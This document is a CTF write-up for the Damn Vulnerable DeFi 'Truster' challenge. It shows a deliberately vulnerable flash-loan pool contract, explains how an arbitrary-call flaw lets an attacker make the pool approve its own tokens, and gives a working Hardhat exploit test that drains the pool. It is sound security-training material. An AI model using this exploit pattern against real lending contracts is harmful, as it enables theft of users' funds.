# Damn Vulnerable Defi: 3. Truster

> More and more lending pools are offering flash loans.
> In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
> Currently the pool has 1 million DVT tokens in balance. And you have nothing. But don't worry, you might be able to take them all from the pool. In a single transaction.

**Objective of CTF:**

- Steal all ETH from the pool.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
  using Address for address;

  IERC20 public immutable damnValuableToken;

  constructor(address tokenAddress) {
    damnValuableToken = IERC20(tokenAddress);
  }

  function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
  ) external nonReentrant {
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    damnValuableToken.transfer(borrower, borrowAmount);
    target.functionCall(data);

    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
  }
}
```

## The Attack

The lender is making a very trustful function call to a `target` with the given calldata `data`. The call-data can be anything, such as transferring the tokens of Truster to us. However, that would fail to pay back the flash loan within the same transaction,

Instead, we can make it approve all of its tokens for us, by giving the token address as `target` and `data` as an approval function call. This way, we have _access_ to all the tokens but have not withdrawn them yet. Once the `flashLoan` is done, we can take all the approved tokens.

## Proof of Concept

The Hardhat test below demonstrates this attack.

```ts
describe('Damn Vulnerable Defi 3: Truster', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let token: DamnValuableToken;
  let pool: TrusterLenderPool;

  const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    token = await ethers.getContractFactory('DamnValuableToken', owner).then(f => f.deploy());
    pool = await ethers.getContractFactory('TrusterLenderPool', owner).then(f => f.deploy(token.address));

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL); // pool has quite a lot of tokens
    expect(await token.balanceOf(attacker.address)).to.equal(0); // attacker has nothing
  });

  it('should drain tokens from the pool', async () => {
    // get balance
    const balance = await token.balanceOf(pool.address);

    // make the flash loan function do approve tokens for us
    await pool
      .connect(attacker)
      .flashLoan(
        0,
        attacker.address,
        token.address,
        token.interface.encodeFunctionData('approve', [attacker.address, balance])
      );
    expect(await token.allowance(pool.address, attacker.address)).to.eq(balance);

    await token.connect(attacker).transferFrom(pool.address, attacker.address, balance);
    // NOTE: this attack could be done in a single transaction using a middleman contract too
  });

  after(async () => {
    // attacker has taken all tokens from the pool
    expect(await token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal('0');
  });
});
```
